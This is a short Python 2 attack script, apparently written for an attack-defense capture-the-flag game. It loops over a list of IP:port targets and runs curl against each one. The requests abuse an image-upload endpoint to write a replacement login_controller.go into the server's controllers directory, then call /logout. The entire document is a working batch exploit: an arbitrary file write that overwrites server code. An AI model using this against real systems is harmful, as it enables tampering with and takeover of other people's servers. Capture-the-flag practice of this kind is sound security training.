#!/usr/bin/python2

import os

hosts = open('data/ip.data').readlines()
for host in hosts:
    host = host.strip()
    ip,port = host.split(':')
    print ip
    r = os.popen('curl %s:%s/api/upload/ -F "type=image" -F "savepath=/gotsctf2018/controllers" -F "image=@login_controller.go" --connect-timeout 2 '%(ip,port))
    r = os.popen('curl %s:%s/logout'%(ip,port))
    print r.read()



